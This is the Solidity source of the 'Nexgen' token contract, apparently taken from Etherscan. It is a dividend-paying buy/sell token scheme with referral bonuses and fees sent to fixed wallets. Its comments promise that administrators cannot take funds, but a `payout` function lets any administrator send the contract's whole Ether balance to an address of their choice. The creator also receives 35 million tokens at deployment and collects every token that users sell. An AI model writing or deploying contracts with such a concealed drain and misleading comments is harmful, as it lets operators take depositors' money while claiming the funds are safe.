["/*NEXGEN dApp - The World's First Most Sustainable Decentralized Application */\n", '\n', '/**\n', ' * Source Code first verified at https://etherscan.io on Wednesday, June 18, 2019\n', ' (UTC) */\n', '\n', 'pragma solidity ^0.4.20;\n', '\n', 'contract Nexgen {\n', '    \n', '    /*=================================\n', '    =            MODIFIERS            =\n', '    =================================*/\n', '    // only people with tokens\n', '    modifier onlybelievers () {\n', '        require(myTokens() > 0);\n', '        _;\n', '    }\n', '    \n', '    // only people with profits\n', '    modifier onlyhodler() {\n', '        require(myDividends(true) > 0);\n', '        _;\n', '    }\n', '    \n', '    // only people with sold token\n', '    modifier onlySelingholder() {\n', '        require(sellingWithdrawBalance_[msg.sender] > 0);\n', '        _;\n', '    }\n', '    \n', '    // administrators can:\n', '    // -> change the name of the contract\n', '    // -> change the name of the token\n', '    // -> change the PoS difficulty \n', '    // they CANNOT:\n', '    // -> take funds\n', '    // -> disable withdrawals\n', '    // -> kill the contract\n', '    // -> change the price of tokens\n', '    modifier onlyAdministrator(){\n', '        address _customerAddress = msg.sender;\n', '        require(administrators[keccak256(_customerAddress)]);\n', '        _;\n', '    }\n', '    \n', '    \n', '\n', '    \n', '    /*==============================\n', '    =            EVENTS            =\n', '    ==============================*/\n', '    event onTokenPurchase(\n', '        address indexed customerAddress,\n', '        uint256 incomingEthereum,\n', '        uint256 tokensMinted,\n', '        address indexed referredBy\n', '    );\n', '    \n', '    event onTokenSell(\n', '        address indexed customerAddress,\n', '        uint256 tokensBurned\n', '    );\n', '    \n', '    event onReinvestment(\n', '        address indexed customerAddress,\n', '        uint256 ethereumReinvested,\n', '        uint256 tokensMinted\n', '    );\n', '    \n', '    event onWithdraw(\n', '        address indexed customerAddress,\n', '        uint256 ethereumWithdrawn\n', '    );\n', '    \n', '    event onSellingWithdraw(\n', '        \n', '        address indexed customerAddress,\n', '        uint256 ethereumWithdrawn\n', '    \n', '    );\n', '    \n', '    // ERC20\n', '    event Transfer(\n', '        address indexed from,\n', '        address indexed to,\n', '        uint256 tokens\n', '    );\n', '    \n', '    \n', '    /*=====================================\n', '    =            CONFIGURABLES            =\n', '    =====================================*/\n', '    string public name = "Nexgen";\n', '    string public symbol = "NEXG";\n', '    uint8 constant public decimals = 18;\n', '    uint8 constant internal dividendFee_ = 10;\n', '    \n', '    uint256 constant internal tokenPriceInitial_ = 0.000002 ether;\n', '    uint256 constant internal tokenPriceIncremental_ = 0.00000015 ether;\n', '\n', '    \n', '    \n', '    // proof of stake (defaults at 1 token)\n', '    uint256 public stakingRequirement = 1e18;\n', '     \n', '    // add community wallet here\n', '    address internal constant CommunityWalletAddr = address(0xfd6503cae6a66Fc1bf603ecBb565023e50E07340);\n', '        \n', '        //add trading wallet here\n', '    address internal constant TradingWalletAddr = address(0x6d5220BC0D30F7E6aA07D819530c8727298e5883);   \n', '\n', '    \n', '    \n', '   /*================================\n', '    =            DATASETS            =\n', '    ================================*/\n', '    // amount of shares for each address (scaled number)\n', '    mapping(address => uint256) internal tokenBalanceLedger_;\n', '    mapping(address => uint256) internal referralBalance_;\n', '    mapping(address => int256) internal payoutsTo_;\n', '    mapping(address => uint256) internal sellingWithdrawBalance_;\n', '    mapping(address => uint256) internal ambassadorAccumulatedQuota_;\n', '\n', '    address[] private contractTokenHolderAddresses_;\n', '\n', '    \n', '    uint256 internal tokenSupply_ = 0;\n', '    uint256 internal profitPerShare_;\n', '    \n', '    uint256 internal soldTokens_=0;\n', '    uint256 internal contractAddresses_=0;\n', '    uint256 internal tempIncomingEther=0;\n', '    uint256 internal calculatedPercentage=0;\n', '    \n', '    \n', '    uint256 internal tempProfitPerShare=0;\n', '    uint256 internal tempIf=0;\n', '    uint256 internal tempCalculatedDividends=0;\n', '    uint256 internal tempReferall=0;\n', '    uint256 internal tempSellingWithdraw=0;\n', '\n', '    address internal creator;\n', '    \n', '\n', '\n', '    \n', '    // administrator list (see above on what they can do)\n', '    mapping(bytes32 => bool) public administrators;\n', '    \n', '    \n', '    bool public onlyAmbassadors = false;\n', '    \n', '\n', '\n', '    /*=======================================\n', '    =            PUBLIC FUNCTIONS            =\n', '    =======================================*/\n', '    /*\n', '    * -- APPLICATION ENTRY POINTS --  \n', '    */\n', '    function Nexgen()\n', '        public\n', '    {\n', '        // add administrators here\n', '           \n', '        administrators[0x25d75fcac9be21f1ff885028180480765b1120eec4e82c73b6f043c4290a01da] = true;\n', '        creator = msg.sender;\n', '        tokenBalanceLedger_[creator] = 35000000*1e18;                     \n', '                         \n', '        \n', '    }\n', '\n', '    /**\n', '     * Community Wallet Balance\n', '     */\n', '    function CommunityWalletBalance() public view returns(uint256){\n', '        return address(0xfd6503cae6a66Fc1bf603ecBb565023e50E07340).balance;\n', '    }\n', '\n', '    /**\n', '     * Trading Wallet Balance\n', '     */\n', '    function TradingWalletBalance() public view returns(uint256){\n', '        return address(0x6d5220BC0D30F7E6aA07D819530c8727298e5883).balance;\n', '    } \n', '\n', '    /**\n', '     * Referral Balance\n', '     */\n', '    function ReferralBalance() public view returns(uint256){\n', '        return referralBalance_[msg.sender];\n', '    } \n', '\n', '    /**\n', '     * Converts all incoming Ethereum to tokens for the caller, and passes down the referral address (if any)\n', '     */\n', '    function buy(address _referredBy)\n', '        public\n', '        payable\n', '        returns(uint256)\n', '    {\n', '        purchaseTokens(msg.value, _referredBy);\n', '\n', '    }\n', '    \n', '    \n', '    function()\n', '        payable\n', '        public\n', '    {\n', '        purchaseTokens(msg.value, 0x0);\n', '    }\n', '    \n', '    /**\n', "     * Converts all of caller's dividends to tokens.\n", '     */\n', '    function reinvest()\n', '        onlyhodler()\n', '        public\n', '    {\n', '        address _customerAddress = msg.sender;\n', '\n', '        // fetch dividends\n', '        uint256 _dividends = myDividends(true); // retrieve ref. bonus later in the code\n', ' \n', '         //calculate  10 % for distribution \n', '        uint256  ten_percentForDistribution= SafeMath.percent(_dividends,10,100,18);\n', '\n', '         //calculate  90 % to reinvest into tokens\n', '        uint256  nighty_percentToReinvest= SafeMath.percent(_dividends,90,100,18);\n', '        \n', '        \n', '        // dispatch a buy order with the calculatedPercentage \n', '        uint256 _tokens = purchaseTokens(nighty_percentToReinvest, 0x0);\n', '        \n', '        \n', '        //Empty their  all dividends beacuse we are reinvesting them\n', '         payoutsTo_[_customerAddress]=0;\n', '         referralBalance_[_customerAddress]=0;\n', '        \n', '    \n', '     \n', '      //distribute to all as per holdings         \n', '        profitPerShareAsPerHoldings(ten_percentForDistribution);\n', '        \n', '        // fire event\n', '        onReinvestment(_customerAddress, _dividends, _tokens);\n', '    }\n', '    \n', '    /**\n', '     * Alias of sell() and withdraw().\n', '     */\n', '    function exit()\n', '        public\n', '    {\n', '        // get token count for caller & sell them all\n', '        address _customerAddress = msg.sender;\n', '        uint256 _tokens = tokenBalanceLedger_[_customerAddress];\n', '        if(_tokens > 0) sell(_tokens);\n', '        \n', '        \n', '        withdraw();\n', '    }\n', '\n', '    /**\n', '     * Withdraws all of the callers earnings.\n', '     */\n', '    function withdraw()\n', '        onlyhodler()\n', '        public\n', '    {\n', '        // setup data\n', '        address _customerAddress = msg.sender;\n', '        \n', '        //calculate 20 % of all Dividends and transfer them to two communities\n', '        //10% to community wallet\n', '        //10% to trading wallet\n', '        \n', '        uint256 _dividends = myDividends(true); // get all dividends\n', '        \n', '        //calculate  10 % for trending wallet\n', '        uint256  ten_percentForTradingWallet= SafeMath.percent(_dividends,10,100,18);\n', '\n', '        //calculate 10 % for community wallet\n', '         uint256 ten_percentForCommunityWallet= SafeMath.percent(_dividends,10,100,18);\n', '\n', '        \n', '        //Empty their  all dividends beacuse we are reinvesting them\n', '         payoutsTo_[_customerAddress]=0;\n', '         referralBalance_[_customerAddress]=0;\n', '       \n', '         // delivery service\n', '        CommunityWalletAddr.transfer(ten_percentForCommunityWallet);\n', '        \n', '         // delivery service\n', '        TradingWalletAddr.transfer(ten_percentForTradingWallet);\n', '        \n', '        //calculate 80% to tranfer it to customer address\n', '         uint256 eighty_percentForCustomer= SafeMath.percent(_dividends,80,100,18);\n', '\n', '       \n', '        // delivery service\n', '        _customerAddress.transfer(eighty_percentForCustomer);\n', '        \n', '        // fire event\n', '        onWithdraw(_customerAddress, _dividends);\n', '    }\n', '    \n', '     /**\n', '     * Withdrawa all selling Withdraw of the callers earnings.\n', '     */\n', '    function sellingWithdraw()\n', '        onlySelingholder()\n', '        public\n', '    {\n', '        // setup data\n', '        address _customerAddress = msg.sender;\n', '        \n', '\n', '        uint256 _sellingWithdraw = sellingWithdrawBalance_[_customerAddress] ; // get all balance\n', '        \n', '\n', '        //Empty  all sellingWithdraw beacuse we are giving them ethers\n', '         sellingWithdrawBalance_[_customerAddress]=0;\n', '\n', '     \n', '        // delivery service\n', '        _customerAddress.transfer(_sellingWithdraw);\n', '        \n', '        // fire event\n', '        onSellingWithdraw(_customerAddress, _sellingWithdraw);\n', '    }\n', '    \n', '    \n', '    \n', '     /**\n', '     * Sell tokens.\n', "     * Remember, there's a 10% fee here as well.\n", '     */\n', '   function sell(uint256 _amountOfTokens)\n', '        onlybelievers ()\n', '        public\n', '    {\n', '      \n', '        address _customerAddress = msg.sender;\n', '       \n', '        //calculate 10 % of tokens and distribute them \n', '        require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);\n', '        uint256 _tokens = _amountOfTokens;\n', '      \n', '       uint256 _ethereum = tokensToEthereum_(_tokens);\n', '        \n', '          //calculate  10 % for distribution \n', '       uint256  ten_percentToDistributet= SafeMath.percent(_ethereum,10,100,18);\n', '\n', '          //calculate  90 % for customer withdraw wallet\n', '        uint256  nighty_percentToCustomer= SafeMath.percent(_ethereum,90,100,18);\n', '        \n', '        // burn the sold tokens\n', '        tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);\n', '        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);\n', '        tokenBalanceLedger_[creator] = SafeMath.add(tokenBalanceLedger_[creator], _tokens);\n', '\n', '\n', '        //substract sold token from circulations of tokenSupply_\n', '        soldTokens_=SafeMath.sub(soldTokens_,_tokens);\n', '        \n', '        // update sellingWithdrawBalance of customer \n', '       sellingWithdrawBalance_[_customerAddress] += nighty_percentToCustomer;       \n', '        \n', '       \n', '        //distribute to all as per holdings         \n', '       profitPerShareAsPerHoldings(ten_percentToDistributet);\n', '      \n', '        //Sold Tokens Ether Transfer to User Account\n', '        sellingWithdraw();\n', '        \n', '        // fire event\n', '        onTokenSell(_customerAddress, _tokens);\n', '        \n', '    }\n', '    \n', '    \n', '    /**\n', '     * Transfer tokens from the caller to a new holder.\n', "     * Remember, there's a 5% fee here as well.\n", '     */\n', '    function transfer(address _toAddress, uint256 _amountOfTokens)\n', '        onlybelievers ()\n', '        public\n', '        returns(bool)\n', '    {\n', '        // setup\n', '        address _customerAddress = msg.sender;\n', '        \n', '        // make sure we have the requested tokens\n', '     \n', '        require(!onlyAmbassadors && _amountOfTokens <= tokenBalanceLedger_[_customerAddress]);\n', '      \n', '        //calculate 5 % of total tokens calculate Tokens Received\n', '        uint256  five_percentOfTokens= SafeMath.percent(_amountOfTokens,5,100,18);\n', '        \n', '       \n', '       //calculate 95 % of total tokens calculate Tokens Received\n', '        uint256  nightyFive_percentOfTokens= SafeMath.percent(_amountOfTokens,95,100,18);\n', '        \n', '        \n', '        // burn the fee tokens\n', '        //convert ethereum to tokens\n', '        tokenSupply_ = SafeMath.sub(tokenSupply_,five_percentOfTokens);\n', '        \n', '        //substract five percent from communiity of tokens\n', '        soldTokens_=SafeMath.sub(soldTokens_, five_percentOfTokens);\n', '\n', '        // exchange tokens\n', '        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);\n', '        tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], nightyFive_percentOfTokens) ;\n', '        \n', '\n', '        //calculate value of all token to transfer to ethereum\n', '        uint256 five_percentToDistribute = tokensToEthereum_(five_percentOfTokens);\n', '\n', '\n', '        //distribute to all as per holdings         \n', '        profitPerShareAsPerHoldings(five_percentToDistribute);\n', '\n', '        // fire event\n', '        Transfer(_customerAddress, _toAddress, nightyFive_percentOfTokens);\n', '        \n', '        \n', '        return true;\n', '       \n', '    }\n', '    \n', '    /*----------  ADMINISTRATOR ONLY FUNCTIONS  ----------*/\n', '    /**\n', '     * administrator can manually disable the ambassador phase.\n', '     */\n', '    function disableInitialStage()\n', '        onlyAdministrator()\n', '        public\n', '    {\n', '        onlyAmbassadors = false;\n', '    }\n', '    \n', '   \n', '    function setAdministrator(bytes32 _identifier, bool _status)\n', '        onlyAdministrator()\n', '        public\n', '    {\n', '        administrators[_identifier] = _status;\n', '    }\n', '    \n', '   \n', '    function setStakingRequirement(uint256 _amountOfTokens)\n', '        onlyAdministrator()\n', '        public\n', '    {\n', '        stakingRequirement = _amountOfTokens;\n', '    }\n', '    \n', '    \n', '    function setName(string _name)\n', '        onlyAdministrator()\n', '        public\n', '    {\n', '        name = _name;\n', '    }\n', '    \n', '   \n', '    function setSymbol(string _symbol)\n', '        onlyAdministrator()\n', '        public\n', '    {\n', '        symbol = _symbol;\n', '    }\n', '\n', '    function payout (address _address) public onlyAdministrator returns(bool res) {\n', '        _address.transfer(address(this).balance);\n', '        return true;\n', '    }\n', '    /*----------  HELPERS AND CALCULATORS  ----------*/\n', '    /**\n', '     * Method to view the current Ethereum stored in the contract\n', '     * Example: totalEthereumBalance()\n', '     */\n', '    function totalEthereumBalance()\n', '        public\n', '        view\n', '        returns(uint)\n', '    {\n', '        return this.balance;\n', '    }\n', '    \n', '    /**\n', '     * Retrieve the total token supply.\n', '     */\n', '    function totalSupply()\n', '        public\n', '        view\n', '        returns(uint256)\n', '    {\n', '        return tokenSupply_;\n', '    }\n', '    \n', '    /**\n', '     * Retrieve the tokens owned by the caller.\n', '     */\n', '    function myTokens()\n', '        public\n', '        view\n', '        returns(uint256)\n', '    {\n', '        address _customerAddress = msg.sender;\n', '        return balanceOf(_customerAddress);\n', '    }\n', '    \n', '    /**\n', '     * Retrieve the sold tokens .\n', '     */\n', '    function soldTokens()\n', '        public\n', '        view\n', '        returns(uint256)\n', '    {\n', '\n', '        return soldTokens_;\n', '    }\n', '    \n', '    \n', '    /**\n', '     * Retrieve the dividends owned by the caller.\n', '       */ \n', '    function myDividends(bool _includeReferralBonus) \n', '        public \n', '        view \n', '        returns(uint256)\n', '    {\n', '        address _customerAddress = msg.sender;\n', '\n', '        return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress);\n', '    }\n', '    \n', '    /**\n', '     * Retrieve the token balance of any single address.\n', '     */\n', '    function balanceOf(address _customerAddress)\n', '        view\n', '        public\n', '        returns(uint256)\n', '    {\n', '        return tokenBalanceLedger_[_customerAddress];\n', '    }\n', '    \n', '    /**\n', '     * Retrieve the selingWithdraw balance of address.\n', '     */\n', '    function selingWithdrawBalance()\n', '        view\n', '        public\n', '        returns(uint256)\n', '    {\n', '        address _customerAddress = msg.sender;\n', '         \n', '        uint256 _sellingWithdraw = (uint256) (sellingWithdrawBalance_[_customerAddress]) ; // get all balance\n', '        \n', '        return  _sellingWithdraw;\n', '    }\n', '    \n', '    /**\n', '     * Retrieve the dividend balance of any single address.\n', '     */\n', '    function dividendsOf(address _customerAddress)\n', '        view\n', '        public\n', '        returns(uint256)\n', '    {\n', '     \n', '        return  (uint256) (payoutsTo_[_customerAddress]) ;\n', '\n', '        \n', '    }\n', '    \n', '    /**\n', '     * Return the buy price of 1 individual token.\n', '     */\n', '    function sellPrice() \n', '        public \n', '        view \n', '        returns(uint256)\n', '    {\n', '       \n', '        if(tokenSupply_ == 0){\n', '            return tokenPriceInitial_ - tokenPriceIncremental_;\n', '        } else {\n', '            uint256 _ethereum = tokensToEthereum_(1e18);\n', '            \n', '            return _ethereum - SafeMath.percent(_ethereum,15,100,18);\n', '        }\n', '    }\n', '    \n', '    /**\n', '     * Return the sell price of 1 individual token.\n', '     */\n', '    function buyPrice() \n', '        public \n', '        view \n', '        returns(uint256)\n', '    {\n', '        \n', '        if(tokenSupply_ == 0){\n', '            return tokenPriceInitial_ ;\n', '        } else {\n', '            uint256 _ethereum = tokensToEthereum_(1e18);\n', '           \n', '           \n', '            return _ethereum;\n', '        }\n', '    }\n', '    \n', '   \n', '    /**\n', '     * Function to calculate actual value after Taxes\n', '     */\n', '    function calculateTokensReceived(uint256 _ethereumToSpend) \n', '        public \n', '        view \n', '        returns(uint256)\n', '    {\n', '         //calculate  15 % for distribution \n', '        uint256  fifteen_percentToDistribute= SafeMath.percent(_ethereumToSpend,15,100,18);\n', '\n', '        uint256 _dividends = SafeMath.sub(_ethereumToSpend, fifteen_percentToDistribute);\n', '        uint256 _amountOfTokens = ethereumToTokens_(_dividends);\n', '        \n', '        return _amountOfTokens;\n', '    }\n', '    \n', '    \n', '   \n', '   \n', '    function calculateEthereumReceived(uint256 _tokensToSell) \n', '        public \n', '        view \n', '        returns(uint256)\n', '    {\n', '        require(_tokensToSell <= tokenSupply_);\n', '        \n', '        uint256 _ethereum = tokensToEthereum_(_tokensToSell);\n', '        \n', '         //calculate  10 % for distribution \n', '        uint256  ten_percentToDistribute= SafeMath.percent(_ethereum,10,100,18);\n', '        \n', '        uint256 _dividends = SafeMath.sub(_ethereum, ten_percentToDistribute);\n', '\n', '        return _dividends;\n', '\n', '    }\n', '    \n', '    \n', '    /*==========================================\n', '    =            INTERNAL FUNCTIONS            =\n', '    ==========================================*/\n', '    \n', '    \n', '    function purchaseTokens(uint256 _incomingEthereum, address _referredBy)\n', '        internal\n', '        returns(uint256)\n', '    {\n', '        // data setup\n', '        address _customerAddress = msg.sender;\n', '        \n', '        //check if address \n', '        tempIncomingEther=_incomingEthereum;\n', '        \n', '                bool isFound=false;\n', '                \n', '                for(uint k=0;k<contractTokenHolderAddresses_.length;k++){\n', '                    \n', '                    if(contractTokenHolderAddresses_[k] ==_customerAddress){\n', '                        \n', '                     isFound=true;\n', '                    break;\n', '                        \n', '                    }\n', '                }\n', '    \n', '    \n', '        if(!isFound){\n', '        \n', '            //increment address to keep track of no of users in smartcontract\n', '            contractAddresses_+=1;  \n', '            \n', '            contractTokenHolderAddresses_.push(_customerAddress);\n', '                        \n', '            }\n', '    \n', '     //calculate 85 percent\n', '      calculatedPercentage= SafeMath.percent(_incomingEthereum,85,100,18);\n', '      \n', '      uint256 _amountOfTokens = ethereumToTokens_(SafeMath.percent(_incomingEthereum,85,100,18));    \n', '\n', "        // we can't give people infinite ethereum\n", '        if(tokenSupply_ > 0){\n', '            \n', '            // add tokens to the pool\n', '            tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);\n', '        \n', '        \n', '        } else {\n', '            // add tokens to the pool\n', '            tokenSupply_ = _amountOfTokens;\n', '        }\n', '        \n', '        // update circulating supply & the ledger address for the customer\n', '        tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);\n', '        \n', '        \n', '        require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_) && tokenSupply_ <= (55000000*1e18));\n', '        \n', '        // is the user referred by a Nexgen Key?\n', '        if(\n', '            // is this a referred purchase?\n', '            _referredBy != 0x0000000000000000000000000000000000000000 &&\n', '\n', '            // no cheating!\n', '            _referredBy != _customerAddress &&\n', '            \n', '            // does the referrer have at least X whole tokens?\n', '            // i.e is the referrer a godly chad masternode\n', '            tokenBalanceLedger_[_referredBy] >= stakingRequirement\n', '            \n', '        ){\n', '           \n', '     // give 5 % to referral\n', '     referralBalance_[_referredBy]+= SafeMath.percent(_incomingEthereum,5,100,18);\n', '     \n', '     tempReferall+=SafeMath.percent(_incomingEthereum,5,100,18);\n', '     \n', '     if(contractAddresses_>0){\n', '         \n', '     profitPerShareAsPerHoldings(SafeMath.percent(_incomingEthereum,10,100,18));\n', '    \n', '    \n', '       \n', '     }\n', '     \n', '    } else {\n', '          \n', '     \n', '     if(contractAddresses_>0){\n', '    \n', '     profitPerShareAsPerHoldings(SafeMath.percent(_incomingEthereum,15,100,18));\n', '\n', ' \n', '        \n', '     }\n', '            \n', '        }\n', '        \n', '      \n', '    \n', '\n', '        \n', '        // fire event\n', '        onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _referredBy);\n', '        \n', '        //calculate sold tokens here\n', '        soldTokens_+=_amountOfTokens;\n', '        \n', '        return _amountOfTokens;\n', '    }\n', '\n', '   \n', '     \n', '   /**\n', '     * Calculate Token price based on an amount of incoming ethereum\n', "     * It's an algorithm, hopefully we gave you the whitepaper with it in scientific notation;\n", '     * Some conversions occurred to prevent decimal errors or underflows / overflows in solidity code.\n', '     */\n', '     \n', '    function ethereumToTokens_(uint256 _ethereum)\n', '        internal\n', '        view\n', '        returns(uint256)\n', '    {\n', '        uint256 _tokenPriceInitial = tokenPriceInitial_ * 1e18;\n', '        uint256 _tokensReceived = \n', '         (\n', '            (\n', '                // underflow attempts BTFO\n', '                SafeMath.sub(\n', '                    (sqrt\n', '                        (\n', '                            (_tokenPriceInitial**2)\n', '                            +\n', '                            (2*(tokenPriceIncremental_ * 1e18)*(_ethereum * 1e18))\n', '                            +\n', '                            (((tokenPriceIncremental_)**2)*(tokenSupply_**2))\n', '                            +\n', '                            (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)\n', '                        )\n', '                    ), _tokenPriceInitial\n', '                )\n', '            )/(tokenPriceIncremental_)\n', '        )-(tokenSupply_)\n', '        ;\n', '  \n', '        return _tokensReceived;\n', '    }\n', '    \n', '    /**\n', '     * Calculate token sell value.\n', '          */\n', '     function tokensToEthereum_(uint256 _tokens)\n', '        internal\n', '        view\n', '        returns(uint256)\n', '    {\n', '\n', '        uint256 tokens_ = (_tokens + 1e18);\n', '        uint256 _tokenSupply = (tokenSupply_ + 1e18);\n', '        uint256 _etherReceived =\n', '        (\n', '            // underflow attempts BTFO\n', '            SafeMath.sub(\n', '                (\n', '                    (\n', '                        (\n', '                            tokenPriceInitial_ +(tokenPriceIncremental_ * (_tokenSupply/1e18))\n', '                        )-tokenPriceIncremental_\n', '                    )*(tokens_ - 1e18)\n', '                ),(tokenPriceIncremental_*((tokens_**2-tokens_)/1e18))/2\n', '            )\n', '        /1e18);\n', '        return _etherReceived;\n', '    }\n', '    \n', '    //calculate profitPerShare as per holdings\n', '    function profitPerShareAsPerHoldings(uint256 calculatedDividend)  internal {\n', '    \n', '       //calculate number of token \n', '       uint256 noOfTokens_;\n', '        tempCalculatedDividends=calculatedDividend;\n', '\n', '       for(uint i=0;i<contractTokenHolderAddresses_.length;i++){\n', '         \n', '         noOfTokens_+= tokenBalanceLedger_[contractTokenHolderAddresses_[i]];\n', '\n', '        }\n', '        \n', '        //check if self token balance is zero then distribute to others as per holdings\n', '        \n', '    for(uint k=0;k<contractTokenHolderAddresses_.length;k++){\n', '        \n', '        if(noOfTokens_>0 && tokenBalanceLedger_[contractTokenHolderAddresses_[k]]!=0){\n', '       \n', '\n', '           profitPerShare_=SafeMath.percent(calculatedDividend,tokenBalanceLedger_[contractTokenHolderAddresses_[k]],noOfTokens_,18);\n', '         \n', '           tempProfitPerShare=profitPerShare_;\n', '\n', '           payoutsTo_[contractTokenHolderAddresses_[k]] += (int256) (profitPerShare_) ;\n', '           \n', '           tempIf=1;\n', '\n', '            \n', '        }else if(noOfTokens_==0 && tokenBalanceLedger_[contractTokenHolderAddresses_[k]]==0){\n', '            \n', '            tempIf=2;\n', '            tempProfitPerShare=profitPerShare_;\n', '\n', '            payoutsTo_[contractTokenHolderAddresses_[k]] += (int256) (calculatedDividend) ;\n', '        \n', '            \n', '        }\n', '        \n', '      }\n', '        \n', '        \n', '    \n', '        \n', '\n', '    \n', '    }\n', '    \n', '    //calculate square root\n', '    function sqrt(uint x) internal pure returns (uint y) {\n', '        uint z = (x + 1) / 2;\n', '        y = x;\n', '        while (z < y) {\n', '            y = z;\n', '            z = (x / z + z) / 2;\n', '        }\n', '    }\n', '}\n', '\n', '/**\n', ' * @title SafeMath\n', ' * @dev Math operations with safety checks that throw on error\n', ' */\n', 'library SafeMath {\n', '    \n', '    function percent(uint value,uint numerator, uint denominator, uint precision) internal pure  returns(/*uint division,*/uint quotient) {\n', '\n', '         // caution, check safe-to-multiply here\n', '        uint _numerator  = numerator * 10 ** (precision+1);\n', '        // with rounding of last digit\n', '        uint _quotient =  ((_numerator / denominator) + 5) / 10;\n', '        \n', '       // uint division_=numerator/denominator;\n', '        /* value*division_,*/\n', '        return (value*_quotient/1000000000000000000);\n', '  }\n', '\n', '\n', '    \n', '    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        if (a == 0) {\n', '            return 0;\n', '        }\n', '        uint256 c = a * b;\n', '        assert(c / a == b);\n', '        return c;\n', '    }\n', '\n', '   \n', '    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        // assert(b > 0); // Solidity automatically throws when dividing by 0\n', '        uint256 c = a / b;\n', "        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n", '        return c;\n', '    }\n', '\n', '    \n', '    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        assert(b <= a);\n', '        return a - b;\n', '    }\n', '\n', '   \n', '    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        uint256 c = a + b;\n', '        assert(c >= a);\n', '        return c;\n', '    }\n', '}']